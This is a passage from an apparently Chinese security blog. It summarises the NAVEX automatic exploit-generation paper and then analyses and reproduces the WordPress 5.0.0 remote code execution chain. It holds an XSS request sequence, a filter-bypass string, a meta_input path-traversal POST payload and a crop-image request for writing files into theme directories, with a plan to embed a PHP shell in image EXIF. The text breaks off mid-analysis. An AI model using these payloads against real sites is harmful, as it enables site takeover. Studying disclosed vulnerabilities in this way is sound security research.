alt="回溯遍历算法.png"></p><h4 id="3-1-4-Exploit-String-Generation"><a href="#3-1-4-Exploit-String-Generation" class="headerlink" title="3.1.4 Exploit String Generation"></a>3.1.4 Exploit String Generation</h4><p>利用上一步发现的攻击路径来生成攻击字符串是静态分析的最后一步。首选构造增广公式 Fpath∧Fdb∧Fattack(Fpath是易受攻击的路径；Fdb是从DB标记派生的约束；Fattack是针对漏洞点的可控变量的，其值来源于之前构造的攻击字典)。之后使用求解器求出一组解(解就是是攻击字符串传入可控变量后在易受攻击的路径上经过过滤到达漏洞点依旧可以造成危害)。到此静态分析过程结束，之后的过程是通过动态分析得到攻击字符串到达攻击点的HTTP请求序列。</p><h3 id="3-2-Concrete-Exploit-Generation"><a href="#3-2-Concrete-Exploit-Generation" class="headerlink" title="3.2 Concrete Exploit Generation"></a>3.2 Concrete Exploit Generation</h3><p>NAVEX执行几个步骤来生成具体的Exp，如下图所示。首先，创建导航图来发现所有执行应用程序模块的可能HTTP请求序列；之后，结合静态分析阶段得到的可能漏洞点来筛选对应模块的执行路径；最终，生成可用的Exp。</p><p><img src="https://i.loli.net/2019/03/11/5c865018411ce.png" alt="E1E8930D-6DE3-4869-A279-BDEA0E11761A.png"></p><h4 id="3-2-1-Dynamic-Execution"><a href="#3-2-1-Dynamic-Execution" class="headerlink" title="3.2.1 Dynamic Execution"></a>3.2.1 Dynamic Execution</h4><p>NAVEX使用动态执行方法，借助约束求解和concolic执行来生成大量表单输入，以帮助爬虫最大化应用程序的覆盖范围。</p><p><strong>爬虫</strong>(解决客户端约束条件)：使用种子URL启动，可以对Web站点的每个角色自动化登录验证，采用广度优先遍历算法，新抓取的URL将作为下一次的爬虫的起始。此处的优点在于，首先，爬虫可以构造符合JavaScript验证的输入；其次，有效表单输入的自动生成提高了覆盖范围。</p><p>自动有效输入构造：NAVEX结合了表单HTML约束Fhtml和JavaScript约束Fjs来生成最终形式约束Fform，之后使用求解器来求解，最终得到对应的HTTP请求。示例如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 约束公式</span></span><br><span class="line">Fhtml : (book_name==<span class="string">"Intro to CS by author1"</span> ∨ book_name==<span class="string">"Intro to Math by author2"</span>)</span><br><span class="line">Fjs: edition &gt; <span class="number">0</span></span><br><span class="line">Fform: Fhtml ∧ Fjs</span><br><span class="line"><span class="comment">// 求解得到的HTTP请求</span></span><br><span class="line">http:.../selectBooks.php?action=borrow POST[book name=Intro to CS by author1, edition=<span class="number">2</span>]</span><br></pre></td></tr></table></figure><p><strong>解决服务器端约束</strong>：在服务端也会对输入有一定的约束，所以在满足前端约束后必须判断服务端约束是否也同时得到了满足。为解决这个问题，NAVEX会动态跟踪判断信息是否满足服务端约束，主要根据以下两点信息：(i)更改其状态（即，创建新会话，设置新变量和超全局值等）;(ii)执行敏感操作来确定请求是否成功，比如查询数据库等。如果检测到请求没有成功执行，那么将会concolic执行依据服务端程序逻辑得出约束公式并对之前发现的执行路径进行更新，之后使用求解器求解生成新的表单数据进行提交(在成功之前会一直执行这个过程)。服务端约束示例如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(book name==&quot;intro to CS by author1&quot; ∨ book name==&quot;intro to Math by author2&quot;) ∧ length(publisher)&lt;=35 ∧ edition &gt;0</span><br></pre></td></tr></table></figure><p>PS：NAVEX会存储导致成功提交的完整HTTP请求。</p><h4 id="3-2-2-Navigation-Graph"><a href="#3-2-2-Navigation-Graph" class="headerlink" title="3.2.2 Navigation Graph"></a>3.2.2 Navigation Graph</h4><p>导航图是一个有向图G=(N,E)，其中每个节点n∈N表示HTTP请求.每个边e=(ni,nj)∈E表示从ni到nj的导航，表示发起d的请求，可以是链接形式。图中的每个节点都具有以下属性id，URL，role和form params，用于表示表单提交生成的HTTP请求。id属性存储节点的唯一标识符，URL属性是HTTP请求中的URL，它由请求的模块名称和HTTP参数组成，role属性包含爬虫使用的登录凭证。示例图如下：</p><p><img src="https://i.loli.net/2019/03/11/5c864fe6b5e27.png" alt="FAB532BE-E611-4E9F-A43D-06D446DC8ED2.png"></p><h4 id="3-2-3-Final-Exploit-Generation"><a href="#3-2-3-Final-Exploit-Generation" class="headerlink" title="3.2.3 Final Exploit Generation"></a>3.2.3 Final Exploit Generation</h4><p>静态分析：扩展的CPG图和Exp字符串。<br>动态分析：NG导航图。<br>如何将这个两个信息进行组合并产生Exp就是此步的作用。<br><u><strong>优点：将漏洞Exp的构造问题转换为对图的简单搜索问题。</strong></u><br>难点：文件被包含这个过程在NG中是看不到的。<br>难点解决：预处理包含解析，此步骤创建存储文件包含关系的包含映射。通过执行遍历来构造映射，该遍历在增强的CPG中搜索表示对文件包含PHP函数的调用的节点，最终将得到包含图。<br>之后使用NG和包含图来搜索公共模块到存在漏洞模块的路径，具体算法见下图：</p><p><img src="https://i.loli.net/2019/03/11/5c86503f36ba1.png" alt="Exp生成算法.png"></p><p>依据Figure4我们使用算法得到的序列如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1. http://localhost/App/index.php</span><br><span class="line">2. http://localhost/App/selectBooks.php with POST params:[book name=intro to CS by author1, edition=2,publisher=aaaaaaa]</span><br><span class="line">3. http://localhost/App/selectBooks.php?action</span><br><span class="line">=borrow</span><br><span class="line">4. http://localhost/App/hold.php</span><br><span class="line">5. http://localhost/App/hold.php?step=checkout</span><br><span class="line">6. http://localhost/App/hold.php?step=checkout</span><br><span class="line">&amp;msg=&lt;script&gt;alert(”XSS”);&lt;/script&gt;</span><br></pre></td></tr></table></figure><h2 id="4-Implementation"><a href="#4-Implementation" class="headerlink" title="4 Implementation"></a>4 Implementation</h2><p>NAVEX基于现有的几种工具进行实现：</p><ol><li>扩展的CPG图利用phpjoern进行实现；</li><li>扩展的CPG图存储在Neo4j图形数据库中；</li><li>图遍历算法使用Apache TinkerPop编写；</li><li>约束求解使用z3以及其扩展Z3-str；</li><li>爬虫程序使用被约束和z3断言扩展的crawler4j；</li><li>爬虫对JavaScript的处理使用了Narcissus JavaScript引擎的扩展；</li><li>服务端代码执行跟踪使用Xdebug。</li></ol><h2 id="5-Evaluation"><a href="#5-Evaluation" class="headerlink" title="5 Evaluation"></a>5 Evaluation</h2><p><strong>数据集</strong>：26个真实PHP应用程序，代码库组合为3.2M SLOC和22.7K PHP文件如下表所示。<br>标准：<br>(i) 评估最流行应用的最新版本，并且要求是复杂且大型的PHP应用程序，如Joomla，HotCRP和WordPress；<br>(ii) 使用NAVEX与已有的一些先进项目(例如，Chainsaw，RIPS)进行比较。</p><p><strong>部署</strong>：实验环境：Ubuntu 12.04 LTS VM，2核2.4GHz，40GB RAM。目标WebApp部署：(1)进行静态分析；(2)部署后进行动态分析(注意每次爬虫后要恢复数据库初始状态)</p><p><strong>结果摘要</strong>。 NAVEX共构建了204个漏洞exp，其中195个注入类型，9个是逻辑漏洞。 增强的CPG平均将假阳性（FP）减少了87％。包含用于构建导航图的客户端代码分析将Exp生成的精度平均提高了54％。 在评估集上，NAVEX能够进行6个HTTP请求来拼接出Exp。</p><p><strong>增强的代码属性图统计</strong>：表2显示了增强的CPG构建时间和大小，可以看出NAVEX的运行时开销很低。</p><p><img src="https://i.loli.net/2019/03/11/5c86506447b7c.png" alt="FC3B9A34-8992-4056-B2C1-D64DDAADDF90.png"></p><p><strong>导航图统计</strong>：表3总结了在NAVEX的步骤II中生成漏洞Exp的总时间。 </p><p><img src="https://i.loli.net/2019/03/11/5c86508b926af.png" alt="18F43907-0C4A-45B3-9AA5-C2F69FF7D087.png"></p><p>以上是综述，下面将阐述作者从四个方面对NAVEX的评估：1.Exploits；2.定量分析；3.与相关工作的比较；4.限制和讨论</p><h3 id="5-1-Exploits"><a href="#5-1-Exploits" class="headerlink" title="5.1 Exploits"></a>5.1 Exploits</h3><p>接下来作者将对NAVEX针对的漏洞逐一简要说明：</p><p><strong>SQLI漏洞</strong>：<br>漏洞触发点：mssql_query, mysql_query, mysqli_query,sqlite_query<br>漏洞定位：155个SQLI可利用的漏洞点，其运行时间为37分和45秒。<br>Exp生成：105个SQLI漏洞利用Exp，其运行时间为7分和76秒。</p><p><img src="https://i.loli.net/2019/03/11/5c8650aaa28e6.png" alt="D29F0E7F-0DA4-4436-9CBB-6F26672EAA58.png"></p><p><strong>SQLI漏洞利用</strong>：</p><p><img src="https://i.loli.net/2019/03/11/5c8650c83c32d.png" alt="21786D72-6EA2-42F9-BA98-9FCCEC0E3457.png"></p><p><img src="https://i.loli.net/2019/03/11/5c8650ea25570.png" alt="E6C92C6F-A2FF-44E8-B0C2-BE47B6B0D734.png"></p><p><strong>XSS漏洞</strong>：<br>漏洞触发点：echo、print<br>漏洞定位：1小时49分钟内共发现了133个XSS可利用的漏洞点，其中5个是误报<br>Exp生成：40分12秒为133个漏洞点生成了90个XSS漏洞利用</p><p><img src="https://i.loli.net/2019/03/11/5c86510a28218.png" alt="F75221DA-5F90-4EDD-835C-60997FB0304F.png"></p><p><strong>XSS漏洞利用</strong>：如下所示包含strtr函数的路径会被认为是可被攻击的，但是htmlspecialchars的就不会，因为strtr函数对XSS的过滤能力很弱，之后求解器会选择%26%2339%3B-alert(1)-%26%2339%3B来进行绕过。</p><p><img src="https://i.loli.net/2019/03/11/5c86512561ebf.png" alt="13FE3B28-FBD0-482D-B838-9B451F3FABF8.png"></p><p><img src="https://i.loli.net/2019/03/11/5c865140d28c0.png" alt="763D1B5C-B16C-4649-BCD2-0B6E0F793D57.png"></p><p><strong>EAR漏洞</strong>：<br>漏洞触发点：header<br>漏洞定位：17分17秒内发现了19个良性EAR和3个恶意EAR漏洞<br>Exp生成：成功针对22个EAR漏洞生成了9个漏洞利用</p><p><strong>代码执行漏洞</strong>：<br>漏洞触发点：eval<br>漏洞定位：在21m20sec内找到98次调用但是均无安全缺陷</p><p><strong>命令注入漏洞</strong>:<br>漏洞触发点：exec,expect_popen,passthru,pcntl_exec,popen,proc_open,shell_exec,system,mail,backtick_operator<br>漏洞定位：在22m32sec内NAVEX没有找到任何易受影响的漏洞点</p><p><strong>文件包含漏洞</strong>：<br>漏洞触发点：include,include_once,require,require_once<br>漏洞定位：在27分58秒内找到1处接收器内包含了可控变量但是因为后面有约束所以无法构造出Exp，即此处依旧不可利用</p><h3 id="5-2-Measurements"><a href="#5-2-Measurements" class="headerlink" title="5.2 Measurements"></a>5.2 Measurements</h3><ol><li><p>图5显示了NAVEX的性能(定位漏洞点的耗时和构造Exp的耗时)</p><p><img src="https://i.loli.net/2019/03/11/5c865160cea52.png" alt="CF8905E9-7DBB-4F75-B184-56366334D1D0.png"></p></li><li><p>图6显示使用了过滤和DB标签增强的CPG对可能漏洞点判别的影响。(减少了误报)</p></li></ol><p><img src="https://i.loli.net/2019/03/11/5c86517ab78a0.png" alt="DDE0F888-0525-45BB-B7EE-7CB2535C9300.png"></p><ol start="3"><li>总覆盖率为68％</li><li>对客户端代码进行分析带来的好处：提升了精度和覆盖率</li></ol><p><img src="https://i.loli.net/2019/03/11/5c86518cbd05f.png" alt="C2F5E466-359A-44AA-B2A4-FF80E50BA855.png"></p><h3 id="5-3-Comparison-with-Related-Work"><a href="#5-3-Comparison-with-Related-Work" class="headerlink" title="5.3 Comparison with Related Work"></a>5.3 Comparison with Related Work</h3><ol><li><p>漏洞检测方面与RIPS，Chainsaw的对比；</p></li><li><p>Exp生成与Chainsaw(只能够对SQLi和XSS生成Exp)的对比；</p></li><li><p>效率方面与Chainsaw的对比：</p></li></ol><p>生成Exp: NAVEX-&gt;25分钟2秒；Chainsaw-&gt;112分钟<br>前期准备: NAVEX-&gt;18分26秒；Chainsaw-&gt;1天13小时21分</p><h3 id="5-4-Limitations-and-Discussion"><a href="#5-4-Limitations-and-Discussion" class="headerlink" title="5.4 Limitations and Discussion"></a>5.4 Limitations and Discussion</h3><ol><li>Web应用程序的某些功能尚不受支持，比如文件上传逻辑；</li><li>自动从图节点导出的TAC公式不完整(未提及哪些不支持)；</li><li>静态分析进行漏洞定位存在误报；</li><li>CPG图不支持解析动态函数调用(文中说这个不太重要但未具体说明，可能是使用极少)；</li><li>如果网站的动态逻辑不被NAVEX支持，那么将无法构造漏洞利用(比如前面的SchoolMate程序的会话维持未被支持&lt;-笔者从文中得到的信息)</li></ol><h2 id="6-Related-Work"><a href="#6-Related-Work" class="headerlink" title="6 Related Work"></a>6 Related Work</h2><p>详细见论文中表述</p><h2 id="7-Conclusions"><a href="#7-Conclusions" class="headerlink" title="7 Conclusions"></a>7 Conclusions</h2><p>PS: 此部分是一些笔者个人的总结并非论文的最终总结</p><p>之前对PHP漏洞的自动化审计工作主要分为静态分析和动态分析。其中静态分析的一些代表的可实际使用的工具有rips、cobra、Cobra-W以及seay代码审计系统，其中rips的建模分析以及攻击字典的构造是比较详细和全面的。虽然可以参考其代码和论文进行学习，但是开源版对现在而言已经不具有实用价值。cobra是基于AST进行分析，AST是具有一定的局限性的，从分析效果上而言没有控制流图好，当然也没有今天提到的CPG好。但是cobra在AST上建立的分析模型以及他对规则集的引入方式是具有一定参考性的。当然在cobra之后的Cobra-W是令人眼前一亮的感觉，虽然还未完全开发完成，但是它对文件包含的处理以及对于自定义过滤函数的处理思想是很值得学习的(相比rips的暴力直接将代码拼接好一些)。seay代码审计系统的优点就是其中包含了对数据库的审计。其它的还有phpvulhunter等工具，但是年代较为久远因而笔者没有对其代码做进一步的分析。在分析过上面的程序之后笔者也曾在一年前尝试引入别名分析等新机制来进一步改善静态分析的准确率，但是效果不是很理想随后就弃坑了。动态分析最具代表性的是prvd，这个笔者还未进行分析，但是用效果不错，感兴趣可以对其进行进一步的分析。</p><p>最后回到本文，此文提出的NAVEX采用静态分析和动态分析相结合的方式，可以自动完成对漏洞的分析并生成Exp。在文中提到的几个方法都是非常新颖的，从效果上来看很不错。如果从工程的角度来看，完全可以借鉴其思想从而进行深入的开发完善。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;出处：27th USENIX Security Symposium&lt;br&gt;作者：Abeer Alhuzali, Rigel Gjomemo, Birhanu Eshete, and V.N.&lt;br&gt;单位：Venkatakrishnan University of Illin
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>wordpress 5.0.0 RCE分析与复现</title>
    <link href="http://zer0yu.github.io/2019/03/06/wordpress-5-0-0-rce-aanalysis/"/>
    <id>http://zer0yu.github.io/2019/03/06/wordpress-5-0-0-rce-aanalysis/</id>
    <published>2019-03-05T17:15:35.000Z</published>
    <updated>2019-03-06T04:48:44.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-概述"><a href="#0x00-概述" class="headerlink" title="0x00 概述"></a>0x00 概述</h2><p>RIPS于2月20日在博客上披露了一个关于WordPress 5.0.0的远程代码执行漏洞。此漏洞由Post Meta变量覆盖、目录穿越写文件、模板包含组合后构成远程代码执行漏洞。</p><h3 id="1-漏洞触发条件"><a href="#1-漏洞触发条件" class="headerlink" title="1.漏洞触发条件"></a>1.漏洞触发条件</h3><p>（1）存在漏洞的wordpress版本如下：<br><a href="https://github.com/WordPress/WordPress/commit/43bdb0e193955145a5ab1137890bb798bce5f0d2" target="_blank" rel="noopener">WordPress commit \&lt;= 43bdb0e193955145a5ab1137890bb798bce5f0d2 （WordPress 5.1-alpha-44280）</a><br>（2）需要作者权限的账号</p><h3 id="2-漏洞的影响范围"><a href="#2-漏洞的影响范围" class="headerlink" title="2.漏洞的影响范围"></a>2.漏洞的影响范围</h3><p>受影响的wordpress版本为：<br>1.WordPress 5.1-alpha-44280更新后<br>2.未更新的4.9.9~5.0.0的WordPress<br>服务端：windows、linux、mac<br>图片处理库：gd/imagick</p><h2 id="0x01-环境配置"><a href="#0x01-环境配置" class="headerlink" title="0x01 环境配置"></a>0x01 环境配置</h2><p>wordpress在某个版本以后，就增加了自动升级小版本的功能。所以安装好wp以后，需要手工在wp-config.php中加个<code>define(&#39;AUTOMATIC_UPDATER_DISABLED&#39;,true);</code>，禁止其自动更新。</p><p>代码下载最好到对应的<a href="https://cn.wordpress.org/" target="_blank" rel="noopener">wordpress网站</a>下载，因为官方github release版本都被patch了。此处的分析采用的是从wordpress中文网下载的4.9.4版本代码。</p><p>本文的环境搭建：macOS+php7+wordpress4.9.4+imagick6.9.7</p><h2 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h2><h3 id="1-Post-Meta变量覆盖"><a href="#1-Post-Meta变量覆盖" class="headerlink" title="1.Post Meta变量覆盖"></a>1.Post Meta变量覆盖</h3><p>此处的漏洞点出现在wordpress 媒体功能在更新被编辑的图片处，我们上传图片之后，图片的保存路径是<code>wp-content/uploads/years/month</code>，同时会在数据库的<code>wp_postmeta</code>表中<code>_wp_attached_file</code>和<code>_wp_attachment_metadata</code>插入对应的值，第一个值是图片的路径+图片名，第二个是图片的相关信息被序列化后的值，具体信息如下图所示。<br><img src="https://i.loli.net/2019/03/03/5c7b439ce5b3c.png" alt="屏幕快照 2019-03-03 上午11.01.17.png"><br>接下来我们定位到此处的漏洞点，在编辑并更新图片的时候会调用edit_post()函数，wp-admin/includes/post.php:187<br><img src="https://i.loli.net/2019/03/03/5c7b4799e13b4.png" alt="屏幕快照 2019-03-03 上午11.18.30.png"><br>从中可以看到该方法的参数来自<code>$_POST</code>,并且此处也没有任何的过滤，在赋值给<code>$post_data</code>之后，被带入到<code>wp_update_post()</code>函数。我们动态调试跟一下这个函数的调用栈。首先我们直接让程序运行到<code>update_post_meta()</code>这个函数，这个函数根据<code>$post_ID</code>修改<code>post meta field</code>，接着调用<code>update_metadata()</code>更新meta数据，完成之后更新post数据。但是在此处并没有对post的数据进行过滤，我们的<code>$post_data[&quot;meta_input&quot;][&quot;_wp_attached_file&quot;]</code>的值也没有被过滤掉。<br><img src="https://i.loli.net/2019/03/03/5c7b5cab0f798.png" alt="屏幕快照 2019-03-03 下午12.48.07.png"><br>我们继续跟进<code>wp_update_post()</code>函数，点击步进后进入<code>wp_update_post()</code>函数，wp-includes/post.php:3611<br><img src="https://i.loli.net/2019/03/03/5c7b5f1b5cdf7.png" alt="屏幕快照 2019-03-03 下午12.57.47.png"><br>我们可以看到在这个函数的末尾处，如果post_type的值是attachment类型就会调用<code>wp_insert_attachment()</code>函数，wp-includes/post.php:4898。<br><img src="https://i.loli.net/2019/03/03/5c7b606a0a0e3.png" alt="屏幕快照 2019-03-03 下午1.04.31.png"><br>我们继续步进跟一下这个函数，可以看到它接着调用了<code>wp_insert_post()</code>函数，wp-includes/post.php:3044<br>在第3434行可以看到对于meta_input参数，此处遍历传入<code>update_post_meta()</code>函数，我们继续跟进。<br><img src="https://i.loli.net/2019/03/03/5c7b630b3a4cc.png" alt="屏幕快照 2019-03-03 下午1.15.42.png"><br><code>update_post_meta()</code>函数，wp-includes/post.php:1799<br>发现其中调用了<code>update_metadata()</code>函数来做进一步的处理，跟进后发现<code>update_metadata()</code>使用来将数据库中对应的键值进行更新操作，而且在这个过程中没有对<code>meta_input</code>的值做任何的过滤，所以我们可以传入指定的 key 来设置它的值。<br><img src="https://i.loli.net/2019/03/03/5c7b703fb6665.png" alt="屏幕快照 2019-03-03 下午2.11.11.png"><br><img src="https://i.loli.net/2019/03/03/5c7b71445620f.png" alt="屏幕快照 2019-03-03 下午2.16.24.png"><br>在此我们回顾一下这个调用栈<br><img src="https://i.loli.net/2019/03/03/5c7b7228a57e9.png" alt="屏幕快照 2019-03-03 下午2.20.10.png"><br>因此我们构造POST数据包就可以覆盖掉<code>_wp_attached_file</code>的值，覆盖效果及操作如下所示：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#将这个附加到POST数据后</span></span><br><span class="line">&amp;meta_input[_wp_attached_file]=2019/03/z3r0yu.jpg?/../../../../themes/z3r0yu.jpg</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2019/03/03/5c7b735ce8c23.png" alt="屏幕快照 2019-03-03 下午2.24.01.png"><br><img src="https://i.loli.net/2019/03/03/5c7b735cdc061.png" alt="屏幕快照 2019-03-03 下午2.24.34.png"><br><img src="https://i.loli.net/2019/03/03/5c7b735cdcbbd.png" alt="屏幕快照 2019-03-03 下午2.25.13.png"><br>到此为止第处漏洞点的分析利用已经完成，漏洞触发最重要原因就是没有做好过滤，因此该处的补丁为：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">array_diff_key( $post_data, array_flip( <span class="keyword">array</span>( <span class="string">'meta_input'</span>, <span class="string">'file'</span>, <span class="string">'guid'</span> ) ) );</span><br></pre></td></tr></table></figure></p><p>从补丁上可以看到对<code>meta_input</code>做了过滤(PS:你下载的代码中要是出现这个就说明是被patch过了)。</p><h3 id="2-目录穿越造成文件写入"><a href="#2-目录穿越造成文件写入" class="headerlink" title="2.目录穿越造成文件写入"></a>2.目录穿越造成文件写入</h3><p>该问题是建立在之前我们Post Meta变量覆盖漏洞之上的。因为在之前我们是可以在<code>_wp_attached_file</code>处写入任意值的，因此只需要一个方法将我们写入的值进行利用一下就好。<br>在wordpress的图片裁剪功能中，可以实现本地文件读取和远程文件读取。但是远程文件读取这个位置很有意思，如果目标图片在该目录不存在，则通过<strong>本地服务器</strong>下载该图片，如从<code>http://127.0.0.1/wp494/wp-content/uploads/2019/03/2233.jpg</code>下载，裁剪后重新保存。此处我们可以构造一个带参数的url，比如<code>http://127.0.0.1/wp494/wp-content/uploads/2019/03/2233.jpg?z3r0yu</code>，在远程读取的时候会忽略?号之后的内容，从而只对2233.jpg进行剪切后保存。目录穿越问题就存在于此，如果我们构造如下所示的url<code>http://127.0.0.1/wp494/wp-content/uploads/2019/03/2233.jpg?/../../../../themes/twentysixteen/z3r0yu.jpg</code>，wordpress将裁减后的图片保存至<code>wp-content/themes/twentysixteen/</code>目录下，如果图片中包含恶意代码就可能被进一步的利用。</p><p>编辑图片会先调用<code>do_action</code>通过<code>apply_filters()</code>函数进入<code>wp_ajax_crop_image()</code>函数，在wp-admin/includes/ajax-actions.php:3224<br><img src="https://i.loli.net/2019/03/03/5c7b9d181c1cb.png" alt="屏幕快照 2019-03-03 下午5.23.22.png"><br>在函数中首先会调用<code>check_ajax_referer()</code>函数来对用户的权限进行校验，之后调用<code>absint()</code>函数将<code>$_POST[&#39;cropDetails&#39;]</code>的值转换为非负值，之后将参数传入<code>wp_crop_image()</code>函数对图片进行剪裁操作，wp-admin/includes/image.php:25。(PS:你如果想要动态调试经过这一步就要满足上面那些条件)<br><img src="https://i.loli.net/2019/03/03/5c7bb5457da91.png" alt="屏幕快照 2019-03-03 下午7.06.33.png"><br>从数据库取出<code>_wp_attached_file</code>后并没有任何过滤，所以我们之前设置的值在此处已经是完好的，如下图所示。<br><img src="https://i.loli.net/2019/03/03/5c7bb6ca40804.png" alt="屏幕快照 2019-03-03 下午7.12.06.png"><br>只有依据<code>_wp_attached_file</code>的值做了判断，发现文件不存在开始去调用<code>_load_image_to_edit_path()</code>函数，我们进行跟进，wp-admin/includes/image.php:649<br><img src="https://i.loli.net/2019/03/03/5c7bb7f48c935.png" alt="屏幕快照 2019-03-03 下午7.18.02.png"><br>继续跟进后发现调用了<code>wp_get_attachment_url()</code>来拼接url链接。<br><img src="https://i.loli.net/2019/03/03/5c7bbc01d72a8.png" alt="屏幕快照 2019-03-03 下午7.35.18.png"><br><img src="https://i.loli.net/2019/03/03/5c7bbc6c0e928.png" alt="屏幕快照 2019-03-03 下午7.37.06.png"><br>之后上面拼接的url链接传输到<code>wp_get_image_editor()</code>函数中，我们步进跟一下这个函数，wp-includes/media.php:2900<br><img src="https://i.loli.net/2019/03/03/5c7bbd7ce4a66.png" alt="屏幕快照 2019-03-03 下午7.41.33.png"><br>跟进后发现其中调用了<code>_wp_image_editor_choose()</code>函数，继续跟进，wp-includes/media.php:2950<br><img src="https://i.loli.net/2019/03/03/5c7bbe5529943.png" alt="屏幕快照 2019-03-03 下午7.45.15.png"><br>从这里可以看到Wordpress提供了两种方式来处理图片，优先使用Imagick，之后是GD。我们在此要特别注意，这俩对图片的处理方式是不同的：</p><ol><li>Imagick不会去除掉图片中的exif部分，所以我们可以将待执行payload代码加入到exif部分。</li><li>GD会去除图片的exif部分，并且其中的phpcode很难存活。除非通过精心构造一张图片才可以。</li></ol><p>我在此只谈复现分析，暂时不谈对图片的Fuzz，因此选择Imagick库。</p><p>PS:Imagick处理类的load函数中调用的是readImage函数，但在高版本的Imagick上该函数不支持远程图片链接，因此最好采用Imagick-6.9.7及其以下版本。</p><p>完成图片剪裁后就再次进入<code>wp_crop_image()</code>函数中，<code>$dst_file</code>的值是文件名，因此最终路径如下图所示：<br><img src="https://i.loli.net/2019/03/03/5c7bc18c8f840.png" alt="屏幕快照 2019-03-03 下午7.55.15.png"></p><p>之后就是未经任何过滤进入到<code>wp_mkdir_p()</code>函数来创建目录，我们继续跟进后发现其中也没有任何过滤，直接执行到<code>mkdir()</code>进行目录创建，此时<code>$target</code>的值如下所示:<br><img src="https://i.loli.net/2019/03/03/5c7bd1ce0e1dc.png" alt="屏幕快照 2019-03-03 下午9.08.19.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$target:&quot;/Applications/XAMPP/xamppfiles/htdocs/wp494/wp-content/uploads/2019/03/z3r0yu.jpg?/../../../../themes&quot;</span><br></pre></td></tr></table></figure><p>创建完路径之后，调用<code>save()</code>对图片进行保存，我们单步跟进<code>save()</code>函数，wp-includes/class-wp-image-editor-gd.php:364</p><p><img src="https://i.loli.net/2019/03/03/5c7bd4fbcab7c.png" alt="屏幕快照 2019-03-03 下午9.21.40.png"><br>在<code>save()</code>中调用了<code>make_image()</code>函数，继续跟进到wp-includes/class-wp-image-editor.php:394<br><img src="https://i.loli.net/2019/03/03/5c7bd4fbc8a3f.png" alt="屏幕快照 2019-03-03 下午9.21.10.png"><br>此处会用<code>call_user_func_array</code>函数来调用Imagick的<code>writeImage</code>函数，并将<code>$filename</code>传递进去，但是在Linux平台上此函数是不支持不存在的目录跳转的。我们的<code>z3r0yu.jpg?/</code>在这里就是不存在目录，这个函数如果被调用就会抛出错误，从而无法达到任意写的目的。如果想进行绕过只需要多次上传裁剪就可以。</p><p>接下来我们对此部分进行利用，我们接着Post Meta变量覆盖的利用之后进行，使用wordpress的剪切功能并在剪切完保存图片的时候进行burp抓包并将要POST的数据修改如下（PS:_ajax_nonce和id的值要与之前保持一致）：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">action=crop-image&amp;_ajax_nonce=0810f2d564&amp;id=10&amp;cropDetails[x1]=10&amp;cropDetails[y1]=10&amp;cropDetails[width]=10&amp;cropDetails[height]=10&amp;cropDetails[dst_width]=100&amp;cropDetails[dst_height]=100</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2019/03/03/5c7b8d4c08a1e.png" alt="屏幕快照 2019-03-03 下午4.11.54.png"><br>最终会在我们指定的目录下生成剪裁后的图片<br><img src="https://i.loli.net/2019/03/03/5c7b8d4bca96e.png" alt="屏幕快照 2019-03-03 下午4.12.09.png"><br>既然可以成功在指定目录下写入图片文件，那么我们完全可以构造一个包含有shell的图片。但是文件只能是jpg，所以我们还需要结合本地文件包含做进一步的利用。</p><p>小结：此部分我们将POST的数据进行了修改，目的是修改<code>action</code>为<code>crop-image</code>达到触发存在漏洞的<code>wp_crop_image()</code>函数。</p><h3 id="3-本地文件包含-模板功能"><a href="#3-本地文件包含-模板功能" class="headerlink" title="3.本地文件包含(模板功能)"></a>3.本地文件包含(模板功能)</h3><p>之前的工作我们已经达到了任意文件写入的目的，如果想对图片中的代码进行利用，我们必须结合本地文件包含漏洞。此处我们已经预先知道了文件包含点在wordpress的模板位置，它会根据需要加载的页面类型从当前主题下选择需要的模板，如果存在就会被包含。因此我们在此处主要关注与模板包含相关的函数。</p><p>之前我在数据库中关注到一个<code>_wp_page_template</code>字段，而在wordpress中模板文件位置就是存储在数据库中。详查一下发现加载页面所需要的模板文件存储就在wp_postmeta数据库中的<code>_wp_page_template</code>,这个值默认是<code>default</code>。</p><p>所以我们先查看一下这个值的使用位置，可以看到在<code>get_post_meta()</code>函数中对这个值进行了取出，wp-includes/post-template.php:1683。<br><img src="https://i.loli.net/2019/03/04/5c7d1e809b7bb.png" alt="屏幕快照 2019-03-04 下午8.47.22.png"><br><img src="https://i.loli.net/2019/03/04/5c7d1ee1c4d05.png" alt="屏幕快照 2019-03-04 下午8.49.12.png"><br>继续全局检索一些<code>get_page_template_slug()</code>函数的引用位置，可以看到在与模板相关的wp-includes/template.php文件中进行了调用。<br><img src="https://i.loli.net/2019/03/04/5c7d2301373ad.png" alt="屏幕快照 2019-03-04 下午9.05.45.png"><br>继续看代码，发现只有两个函数对<code>get_page_template_slug()</code>进行了调用，第一个是<code>get_page_template()</code>函数，wp-includes/template.php:405；第二个是<code>get_single_template()</code>函数，wp-includes/template.php:481<br><img src="https://i.loli.net/2019/03/04/5c7d2387e1958.png" alt="屏幕快照 2019-03-04 下午9.09.08.png"><br><img src="https://i.loli.net/2019/03/04/5c7d291bc8c07.png" alt="屏幕快照 2019-03-04 